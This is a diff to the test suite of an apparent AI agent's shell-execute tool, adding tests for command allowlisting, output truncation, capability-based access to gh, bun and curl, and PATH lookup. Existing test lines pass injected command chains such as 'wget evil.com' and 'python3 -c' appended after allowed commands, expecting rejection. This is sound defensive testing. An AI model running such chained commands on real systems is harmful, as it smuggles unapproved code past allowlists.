@@ -1,6 +1,6 @@
 import { describe, test, expect, beforeEach, afterEach } from "bun:test";
 import { Effect } from "effect";
-import { mkdirSync, rmSync, existsSync, writeFileSync, readFileSync } from "node:fs";
+import { mkdirSync, rmSync, existsSync, writeFileSync, readFileSync, chmodSync } from "node:fs";
 import { join } from "node:path";
 import { randomUUID } from "node:crypto";
 
@@ -106,6 +106,24 @@ describe("shell-execute tool", () => {
       expect(isCommandAllowed("echo ok && wget evil.com")).toBe(false);
       expect(isCommandAllowed("echo ok | python3 -c 'hack'")).toBe(false);
       expect(isCommandAllowed("ls; node -e 'process.exit()'")).toBe(false);
+    });
+
+    test("does not split on pipe characters inside quoted arguments", () => {
+      expect(
+        isCommandAllowed(
+          "gh api repos/x/y/commits --jq '.[] | {message: .commit.message}'",
+          [...DEFAULT_ALLOWED_COMMANDS, "gh"],
+        ),
+      ).toBe(true);
+    });
+
+    test("still rejects unquoted pipelines that include disallowed executables", () => {
+      expect(
+        isCommandAllowed(
+          "gh api repos/x/y/commits | python3 -c 'print(1)'",
+          [...DEFAULT_ALLOWED_COMMANDS, "gh"],
+        ),
+      ).toBe(false);
     });
 
     test("extracts basename to prevent absolute-path bypass", () => {
@@ -445,9 +463,11 @@ describe("shell-execute tool", () => {
       const handler = shellExecuteHandler({ maxOutputChars: 20 });
       const result = (await Effect.runPromise(
         handler({ command: "echo " + "A".repeat(100) }),
-      )) as { output: string; truncated: boolean };
+      )) as { output: string; truncated: boolean; fullOutput?: string };
       expect(result.output.length).toBeLessThanOrEqual(25); // 20 + possible truncation marker
       expect(result.truncated).toBe(true);
+      expect(result.fullOutput).toBeDefined();
+      expect(result.fullOutput!.length).toBeGreaterThan(result.output.length);
     });
 
     test("includes exitCode in response", async () => {
@@ -670,6 +690,72 @@ describe("shell-execute tool", () => {
       )) as { executed: boolean; output: string };
       expect(result.executed).toBe(true);
       expect(result.output.trim()).toBe("merged");
+    });
+
+    test("commandAccess capability 'github' enables gh", async () => {
+      const handler = shellExecuteHandler({
+        commandAccess: { capabilities: ["github"] },
+      });
+      const result = (await Effect.runPromise(
+        handler({ command: "gh --version" }),
+      )) as { executed: boolean; error?: string };
+      expect(result.executed).toBe(true);
+      expect(result.error).toBeUndefined();
+    });
+
+    test("commandAccess capability 'javascript' enables bun", async () => {
+      const handler = shellExecuteHandler({
+        commandAccess: { capabilities: ["javascript"] },
+      });
+      const result = (await Effect.runPromise(
+        handler({ command: "bun --version" }),
+      )) as { executed: boolean; error?: string };
+      expect(result.executed).toBe(true);
+      expect(result.error).toBeUndefined();
+    });
+
+    test("commandAccess.commands and additionalCommands merge", async () => {
+      const handler = shellExecuteHandler({
+        commandAccess: { commands: ["gh"] },
+        additionalCommands: ["curl"],
+      });
+
+      const gh = (await Effect.runPromise(
+        handler({ command: "gh --version" }),
+      )) as { executed: boolean; error?: string };
+      expect(gh.executed).toBe(true);
+      expect(gh.error).toBeUndefined();
+
+      const curl = (await Effect.runPromise(
+        handler({ command: "curl --version" }),
+      )) as { executed: boolean; error?: string };
+      expect(curl.executed).toBe(true);
+      expect(curl.error).toBeUndefined();
+    });
+
+    test("resolves PATH directories for explicitly opted-in global-style CLIs", async () => {
+      const fakeBinDir = join("/tmp", `rax-shell-bin-${randomUUID()}`);
+      const fakeCliPath = join(fakeBinDir, "mock-global-cli");
+      const originalPath = process.env.PATH;
+
+      mkdirSync(fakeBinDir, { recursive: true });
+      writeFileSync(fakeCliPath, "#!/bin/sh\necho from-mock-global-cli\n");
+      chmodSync(fakeCliPath, 0o755);
+
+      try {
+        process.env.PATH = `${fakeBinDir}:${originalPath ?? ""}`;
+        const handler = shellExecuteHandler({ additionalCommands: ["mock-global-cli"] });
+        const result = (await Effect.runPromise(
+          handler({ command: "mock-global-cli" }),
+        )) as { executed: boolean; output: string; error?: string };
+
+        expect(result.executed).toBe(true);
+        expect(result.error).toBeUndefined();
+        expect(result.output.trim()).toBe("from-mock-global-cli");
+      } finally {
+        process.env.PATH = originalPath;
+        rmSync(fakeBinDir, { recursive: true, force: true });
+      }
     });
   });
 
